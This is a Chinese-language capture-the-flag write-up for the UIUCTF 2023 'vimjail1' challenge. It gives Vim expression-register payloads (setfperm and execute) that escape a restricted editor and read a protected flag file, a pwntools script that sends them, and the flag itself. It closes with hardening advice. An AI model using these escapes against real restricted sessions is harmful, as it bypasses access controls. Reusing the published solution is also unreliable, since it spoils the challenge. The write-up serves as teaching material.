# UIUCTF 2023 vimjail1 Writeup

## 题目简述

远端启动命令为：

```bash
vim -R -M -Z -u /home/user/vimrc
```

Vim 处于只读、禁止修改和 restricted 模式，并通过 `vimrc` 默认进入插入模式、屏蔽多组常见的模式切换按键。与此同时，入口脚本移除了 `/flag.txt` 的读取权限。

## 解题过程

虽然常见逃逸按键被映射为普通文本，插入模式中的表达式寄存器仍然可用：按 `Ctrl-R` 后输入 `=`，Vim 会求值后续 Vimscript 表达式，并把结果插入缓冲区。这为调用内置函数留下了通道。

第一步，通过表达式寄存器调用 `setfperm()`，把 flag 权限改为所有用户可读：

```text
Ctrl-R = setfperm('/flag.txt', 'r--r--r--') Enter Enter
```

第二步调用 `execute()` 执行 Ex 命令，打开 flag 文件：

```text
Ctrl-R = execute(':e /flag.txt') Enter Enter
```

等价的 pwntools 发送片段为：

```python
from pwn import remote

io = remote("vimjail1.chal.uiuc.tf", 1337)
io.recvuntil(b"VIM - Vi IMproved")

# \x12 是 Ctrl-R；第一个换行提交表达式，第二个处理提示并回到输入
io.send(b"\x12=setfperm('/flag.txt', 'r--r--r--')\n\n")
io.send(b"\x12=execute(':e /flag.txt')\n\n")

io.recvuntil(b"uiuctf{")
print((b"uiuctf{" + io.recvuntil(b"}")).decode())
```

Vim 可能显示 `Cannot make changes` 警告，但这不妨碍表达式已经产生副作用。最终读到：

```text
uiuctf{n0_3sc4p3_f0r_y0u_8613a322d0eb0628}
```

## 方法总结

Vim 的插入模式并不是纯文本输入环境。表达式寄存器会执行 Vimscript，`execute()`、文件权限函数等带副作用的内置能力足以绕过按键映射。构建 Vim jail 时，单纯使用 `-R`、`-M`、`-Z` 和重映射逃逸键并不构成可靠沙箱；应从进程权限、文件系统挂载和系统调用层面隔离不可信会话。
